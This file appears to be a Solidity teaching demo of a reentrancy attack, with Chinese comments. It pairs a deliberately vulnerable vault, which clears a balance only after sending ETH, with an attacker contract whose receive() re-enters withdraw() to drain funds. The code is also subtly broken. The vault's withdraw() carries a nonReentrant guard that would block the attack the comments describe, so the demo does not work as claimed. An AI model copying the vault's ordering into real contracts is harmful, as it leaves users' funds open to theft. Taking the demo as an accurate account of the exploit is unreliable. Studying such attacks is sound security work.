// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

// 受害者合约
contract VulnerableVault is ReentrancyGuard {
    mapping(address => uint) public balances;

    //
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant{
        require(balances[msg.sender] > 0, "No balance");

        // 更新余额（放在调用后，导致漏洞）
        uint256 balance = balances[msg.sender];
        // balances[msg.sender] = 0;

        // 发送 ETH（外部调用，容易被攻击者重入）
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // // 更新余额（放在调用后，导致漏洞）
        balances[msg.sender] = 0;
    }
}

// 攻击者合约
// Attacker.sol
contract Attacker {
    // 声明受害者合约
    VulnerableVault public target;
    // 赋值
    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    // 回调函数，趁机再次提取[受害者合约的withdraw中call执行时会触发攻击者合约的receive函数，发送递归]
    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    // 攻击
    function attack() external payable {
        // 检查受害者合约是否余额大于等于1
        require(msg.value >= 1 ether, "Need 1 ETH");
        // 向受害者合约充值1ETH
        target.deposit{value: 1 ether}();
        // 提现1ETH
        target.withdraw();
    }
}
